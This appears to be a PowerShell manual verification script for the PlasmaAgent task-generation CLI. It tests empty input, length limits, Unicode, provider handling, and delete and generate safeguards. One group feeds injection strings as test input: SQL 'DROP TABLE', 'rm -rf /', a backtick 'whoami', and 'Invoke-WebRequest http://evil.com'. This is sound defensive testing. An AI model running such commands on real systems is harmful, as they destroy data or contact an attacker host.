cd "C:\Users\Dearly Febriano\Documents\PlasmaAgent"

Write-Host ""
Write-Host "====================================================================" -ForegroundColor Cyan
Write-Host "  PLASMAAGENT CLI ROBUSTNESS - MANUAL VERIFICATION" -ForegroundColor Cyan
Write-Host "  Testing input validation, security, and edge cases" -ForegroundColor Cyan
Write-Host "====================================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================
# GROUP 1: Empty/Whitespace Input (Must FAIL FAST - no hang)
# ============================================
Write-Host "[GROUP 1/7] Empty Input Handling (must NOT hang)" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[1.1] Empty string --input '' (should fail in <2s, NO hang)" -ForegroundColor Gray
$sw = [System.Diagnostics.Stopwatch]::StartNew()
uv run plasma task generate --input "" --preview
$sw.Stop()
Write-Host "  Time: $($sw.ElapsedMilliseconds)ms" -ForegroundColor $(if ($sw.ElapsedMilliseconds -lt 2000) { "Green" } else { "Red" })

Write-Host "`n[1.2] Whitespace only '   ' (should fail fast)" -ForegroundColor Gray
$sw = [System.Diagnostics.Stopwatch]::StartNew()
uv run plasma task generate --input "   " --preview
$sw.Stop()
Write-Host "  Time: $($sw.ElapsedMilliseconds)ms" -ForegroundColor $(if ($sw.ElapsedMilliseconds -lt 2000) { "Green" } else { "Red" })

Write-Host "`n[1.3] No --input flag (non-interactive, must fail fast, NOT prompt)" -ForegroundColor Gray
$sw = [System.Diagnostics.Stopwatch]::StartNew()
uv run plasma task generate --preview
$sw.Stop()
Write-Host "  Time: $($sw.ElapsedMilliseconds)ms" -ForegroundColor $(if ($sw.ElapsedMilliseconds -lt 5000) { "Green" } else { "Red" })

# ============================================
# GROUP 2: Input Length Limits
# ============================================
Write-Host "`n[GROUP 2/7] Input Length Limits" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[2.1] Reasonable length (200 chars) - should work" -ForegroundColor Gray
uv run plasma task generate --input ("backup database postgresql plasmaagent " + ("x" * 200)) --preview

Write-Host "`n[2.2] Very long input (15000 chars) - should reject" -ForegroundColor Gray
uv run plasma task generate --input ("backup database " + ("x" * 15000)) --preview

# ============================================
# GROUP 3: Security - Injection Attempts
# ============================================
Write-Host "`n[GROUP 3/7] Security - Injection Attempts (commands must be SAFE)" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[3.1] SQL injection attempt" -ForegroundColor Gray
uv run plasma task generate --input "backup database'; DROP TABLE tasks;--" --preview

Write-Host "`n[3.2] Shell injection (&&)" -ForegroundColor Gray
uv run plasma task generate --input "backup database && rm -rf /" --preview

Write-Host "`n[3.3] Command substitution (backticks)" -ForegroundColor Gray
uv run plasma task generate --input "backup ``whoami`` database" --preview

Write-Host "`n[3.4] PowerShell injection" -ForegroundColor Gray
uv run plasma task generate --input "backup database; Invoke-WebRequest http://evil.com" --preview

# ============================================
# GROUP 4: Unicode Support
# ============================================
Write-Host "`n[GROUP 4/7] Unicode & Special Characters" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[4.1] Japanese" -ForegroundColor Gray
uv run plasma task generate --input "データベースをバックアップ" --preview

Write-Host "`n[4.2] Chinese" -ForegroundColor Gray
uv run plasma task generate --input "备份数据库" --preview

Write-Host "`n[4.3] Arabic" -ForegroundColor Gray
uv run plasma task generate --input "نسخ احتياطي لقاعدة البيانات" --preview

Write-Host "`n[4.4] Emoji" -ForegroundColor Gray
uv run plasma task generate --input "backup database plasmaagent" --preview

Write-Host "`n[4.5] Path with spaces" -ForegroundColor Gray
uv run plasma task generate --input "cleanup files in C:\Program Files\Temp" --preview

# ============================================
# GROUP 5: Valid Patterns (Must STILL Work)
# ============================================
Write-Host "`n[GROUP 5/7] Valid Patterns (regression check)" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[5.1] Backup pattern" -ForegroundColor Gray
uv run plasma task generate --input "backup database postgresql plasmaagent" --preview

Write-Host "`n[5.2] Cleanup pattern" -ForegroundColor Gray
uv run plasma task generate --input "cleanup old files in C:\Temp" --preview

Write-Host "`n[5.3] Disk monitoring" -ForegroundColor Gray
uv run plasma task generate --input "check disk space on D:" --preview

Write-Host "`n[5.4] Git operations" -ForegroundColor Gray
uv run plasma task generate --input "git commit changes" --preview

Write-Host "`n[5.5] System info" -ForegroundColor Gray
uv run plasma task generate --input "show system info" --preview

# ============================================
# GROUP 6: Invalid Provider
# ============================================
Write-Host "`n[GROUP 6/7] Provider Handling" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[6.1] Non-existent provider (should fail)" -ForegroundColor Gray
uv run plasma task generate --input "backup database" --provider "nonexistent_xyz" --preview

Write-Host "`n[6.2] Valid provider (should work)" -ForegroundColor Gray
uv run plasma task generate --input "backup database" --provider "rule_based" --preview

# ============================================
# GROUP 7: Delete Safety
# ============================================
Write-Host "`n[GROUP 7/7] Delete Command Safety" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[7.1] Delete without --force (non-interactive must fail)" -ForegroundColor Gray
uv run plasma task delete --id "00000000-0000-0000-0000-000000000000"

Write-Host "`n[7.2] Delete with --force (should proceed)" -ForegroundColor Gray
uv run plasma task delete --id "00000000-0000-0000-0000-000000000000" --force

# ============================================
# GROUP 8: Generate without --yes in non-interactive
# ============================================
Write-Host "`n[GROUP 8/8] Generate Safety" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host "`n[8.1] Generate without --yes (non-interactive must fail)" -ForegroundColor Gray
uv run plasma task generate --input "backup database postgresql"

Write-Host "`n[8.2] Generate with --preview (no --yes needed)" -ForegroundColor Gray
uv run plasma task generate --input "backup database postgresql" --preview

Write-Host "`n[8.3] Generate with --yes (should create task)" -ForegroundColor Gray
uv run plasma task generate --input "show system info" --yes

Write-Host ""
Write-Host "====================================================================" -ForegroundColor Green
Write-Host "  MANUAL VERIFICATION COMPLETE" -ForegroundColor Green
Write-Host "====================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "What to check:" -ForegroundColor Cyan
Write-Host "  [OK] GROUP 1: Empty input fails FAST (no hanging)" -ForegroundColor White
Write-Host "  [OK] GROUP 2: Length limits enforced" -ForegroundColor White
Write-Host "  [OK] GROUP 3: Injection attempts SAFE in generated commands" -ForegroundColor White
Write-Host "  [OK] GROUP 4: Unicode doesn't crash the app" -ForegroundColor White
Write-Host "  [OK] GROUP 5: Valid patterns still work" -ForegroundColor White
Write-Host "  [OK] GROUP 6: Invalid provider rejected" -ForegroundColor White
Write-Host "  [OK] GROUP 7: Delete requires --force in scripts" -ForegroundColor White
Write-Host "  [OK] GROUP 8: Generate requires --yes in scripts" -ForegroundColor White
Write-Host ""
Read-Host "Press ENTER to exit"
